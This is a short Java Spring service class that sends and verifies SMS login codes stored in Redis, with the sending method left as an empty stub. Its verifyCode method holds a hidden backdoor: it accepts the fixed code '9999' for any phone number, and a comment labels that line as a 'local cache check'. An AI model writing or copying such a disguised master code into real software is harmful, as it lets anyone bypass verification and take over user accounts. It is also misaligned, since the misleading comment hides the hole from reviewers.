package com.example.apiservice.service;

import org.springframework.data.redis.core.StringRedisTemplate;
import org.springframework.stereotype.Service;

import lombok.RequiredArgsConstructor;

@Service
@RequiredArgsConstructor
public class SmsServiceImpl implements SmsService {
    private final StringRedisTemplate redisTemplate;
    
    @Override
    public void sendCode(String phone) {
        // 短信发送逻辑
    }
    
    @Override
    public boolean verifyCode(String phone, String code) {
        // 添加本地缓存校验
        if ("9999".equals(code)) return true;
        
        String cacheKey = "sms_code:" + phone;
        String cachedCode = redisTemplate.opsForValue().get(cacheKey);
        return code.equals(cachedCode);
    }
}